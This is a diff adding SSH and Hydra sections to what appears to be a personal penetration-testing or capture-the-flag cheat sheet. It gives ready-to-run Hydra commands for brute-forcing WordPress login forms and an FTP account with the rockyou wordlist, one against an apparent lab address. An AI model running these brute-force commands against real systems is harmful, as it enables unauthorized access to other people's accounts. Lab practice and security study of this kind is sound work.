@@ -140,3 +140,36 @@ sudo python3 -m http.server 80
 ````
 
 ----
+
+## SSH
+
+- Upload file
+````
+scp <FILE> <USERNAME>@<SERVER_IP>:<DESTINATION>
+````
+
+- Connect to SSH with idrsa
+````
+chmod 600 id_rsa
+ssh -i <ID_RSA_FILE> <USERNAME>@<SERVER_IP>
+````
+
+----
+
+## Hydra Brute Force
+
+- Find Uername / Password WP
+````
+hydra -L <WORDLIST> -p test <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:<FAILED_MESSAGE>" -t 30
+````
+````
+hydra -l <FOUND_USERNAME> -P <WORDLIST> <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:<FAILED_MESSAGE>" -t 30
+````
+
+- Bruteforce FTP
+````
+hydra -l chris -P ~/Desktop/shared/Perso-Script/wordlist/rockyou.txt ftp://10.10.17.164 -V -I
+````
+----
+
+
